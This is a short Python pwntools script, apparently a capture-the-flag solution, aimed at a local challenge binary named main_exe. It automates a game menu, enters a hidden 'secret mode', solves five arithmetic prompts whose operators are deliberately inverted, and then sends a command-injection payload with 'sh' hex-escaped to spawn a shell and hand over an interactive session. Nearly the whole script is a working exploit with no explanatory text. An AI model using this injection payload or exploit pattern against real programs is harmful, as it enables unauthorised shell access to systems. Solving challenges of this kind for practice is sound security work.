from pwn import *

# context.log_level = 'debug'
p = process('./main_exe')

p.send('\n') # start game

p.sendline('q') # quit game

p.sendline('TeamH4C') # input name
p.sendline('asdf') # input comment
p.sendline('H4C') # secret mode!!!

p.recv()
for repeat in range(5):
    print p.recvuntil('(New Wave!)')
    q = p.recv(2048).strip()
    for f in ['<[', ']>', '=>> ((???))', '!']:
        q = q.replace(f, '').strip()
    print('question:', q)

    num = []
    oper = []
    for idx, this in enumerate(q.split(' ')):
        if idx%2 != 0: # operater
            oper.append(this)
        else: # num
            num.append(int(this))
    print(num, oper)
    ans = num[0]
    for i in range(4):
        if oper[i] in ('-', '/'):
            ans += num[i+1]
        elif oper[i] in ('+', '%'):
            ans -= num[i+1]
        else:
            ans *= num[i+1]
    print('answer:', ans)
    p.sendline(str(ans))
    print [p.recvline()]
    log.success(str(repeat+1))

p.sendline(";$'\\x73\\x68'") # command injection
p.interactive()
